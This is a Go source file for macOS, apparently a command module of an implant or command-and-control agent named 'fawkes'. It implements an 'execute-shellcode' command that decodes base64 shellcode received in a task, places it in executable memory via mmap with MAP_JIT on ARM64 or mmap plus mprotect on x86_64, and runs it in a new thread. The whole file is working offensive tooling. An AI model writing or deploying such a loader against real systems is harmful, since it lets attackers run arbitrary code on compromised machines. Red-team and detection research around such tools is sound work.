//go:build darwin

package commands

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

const mapJIT = 0x0800

type ExecuteShellcodeCommand struct{}

func (c *ExecuteShellcodeCommand) Name() string {
	return "execute-shellcode"
}

func (c *ExecuteShellcodeCommand) Description() string {
	return "Execute shellcode in the current process via mmap + mprotect"
}

func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: shellcode_b64 parameter required")
	}
	args, parseErr := unmarshalParams[executeShellcodeArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	if args.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 is empty")
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty after decoding")
	}

	pageSize := syscall.Getpagesize()
	allocSize := ((len(shellcode) + pageSize - 1) / pageSize) * pageSize

	var addr uintptr
	var method string

	if runtime.GOARCH == "arm64" {
		addr, method, err = allocShellcodeARM64(shellcode, allocSize)
	} else {
		addr, method, err = allocShellcodeX86(shellcode, allocSize)
	}
	if err != nil {
		return errorf("Error: %v", err)
	}

	funcAddr := addr
	funcPtr := &funcAddr
	go func() {
		runtime.LockOSThread()
		fn := *(*func())(unsafe.Pointer(&funcPtr))
		fn()
	}()

	return successf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: %s\n  Thread created and running",
		len(shellcode), addr, method)
}

func allocShellcodeARM64(shellcode []byte, allocSize int) (uintptr, string, error) {
	addr, _, errno := syscall.Syscall6(
		syscall.SYS_MMAP,
		0,
		uintptr(allocSize),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS|mapJIT,
		^uintptr(0),
		0,
	)
	if errno != 0 {
		return 0, "", fmt.Errorf("mmap MAP_JIT failed: %v", errno)
	}

	//nolint:govet // mmap'd address from syscall is stable
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)

	return addr, "MAP_JIT (ARM64)", nil
}

func allocShellcodeX86(shellcode []byte, allocSize int) (uintptr, string, error) {
	data, err := syscall.Mmap(-1, 0, allocSize,
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS)
	if err != nil {
		return 0, "", fmt.Errorf("mmap failed: %v", err)
	}

	copy(data, shellcode)

	err = syscall.Mprotect(data, syscall.PROT_READ|syscall.PROT_EXEC)
	if err != nil {
		_ = syscall.Munmap(data)
		return 0, "", fmt.Errorf("mprotect RX failed: %v", err)
	}

	addr := uintptr(unsafe.Pointer(&data[0]))
	return addr, "mmap RW + mprotect RX (x86_64)", nil
}
